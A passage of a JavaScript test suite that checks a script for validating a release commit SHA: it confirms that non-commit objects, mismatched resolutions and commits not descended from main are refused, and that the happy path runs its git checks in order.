    assert.equal(r.calls, '', `${JSON.stringify(sha)} must be refused before git`);
  }
});

test('EXECUTED: a 40-hex OID that is not a commit is refused', () => {
  for (const type of ['tag', 'blob', 'tree', 'missing']) {
    const r = runIdentity({ sha: OID, type });
    assert.notEqual(r.status, 0, type);
    assert.match(r.calls, /cat-file -t/, type);
  }
});

test('EXECUTED: a resolution that differs from the input is refused — nothing mutable is emitted', () => {
  const r = runIdentity({ sha: OID, resolved: 'b'.repeat(40) });
  assert.notEqual(r.status, 0);
  assert.equal(r.out.includes('release_sha='), false, 'no output may be emitted on refusal');
});

test('EXECUTED: a non-ancestor of main is refused', () => {
  const r = runIdentity({ sha: OID, ancestorExit: 1 });
  assert.notEqual(r.status, 0);
  assert.match(r.calls, /merge-base --is-ancestor/);
});

test('EXECUTED: the happy path emits the resolved OID, in order, after every proof', () => {
  const r = runIdentity({ sha: OID });
  assert.equal(r.status, 0, r.calls);
  assert.equal(r.out.trim(), `release_sha=${OID}`);
  const order = ['fetch', 'cat-file', 'rev-parse', 'merge-base'];
  let last = -1;
  for (const step of order) {
    const idx = r.calls.indexOf(step);
    assert.ok(idx > last, `${step} runs, and after the previous proof`);
    last = idx;
  }
});
